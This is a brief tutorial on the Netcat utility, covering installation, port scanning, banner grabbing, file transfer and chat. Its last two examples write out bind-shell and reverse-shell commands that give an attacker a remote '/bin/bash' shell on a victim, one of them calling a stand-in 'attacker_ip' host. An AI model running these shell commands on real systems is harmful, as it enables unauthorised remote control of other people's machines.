What is Netcat?

Netcat (often called nc) is a powerful networking utility used for debugging and investigating the network. It's known as the "Swiss Army Knife" of networking. It can read and write data across TCP and UDP connections, perform port scans, file transfers, backdoors, and banner grabbing.

Key Features

  • TCP/UDP port scanning
  • File transfer over the network
  • Reverse and bind shells
  • Banner grabbing (identify services)
  • Listen and connect to arbitrary ports

Installation

On Termux:

pkg install netcat

On Kali Linux:

sudo apt install netcat

Verify Installation:

nc -h

Step-by-Step Usage Examples

1. Port Scanning:

nc -zv target.com 20-100

z: Scan mode, v: verbose

2. Banner Grabbing:

nc target.com 80

Type: HEAD / HTTP/1.0 + Enter

3. File Transfer (Server Side):

nc -l -p 1234 > received.txt

4. File Transfer (Client Side):

nc target_ip 1234 < file.txt

5. Create a Simple Chat:

On system 1: nc -l -p 8888
On system 2: nc ip_of_system1 8888

6. Bind Shell (attacker connects to victim):

On victim: nc -l -p 4444 -e /bin/bash
On attacker: nc victim_ip 4444

7. Reverse Shell (victim connects back):

On attacker: nc -lvp 4444
On victim: nc attacker_ip 4444 -e /bin/bash

Netcat Tips

  • Use -n to skip DNS resolution
  • Use -w to set timeout (e.g. -w 3)
  • Use -u for UDP instead of TCP
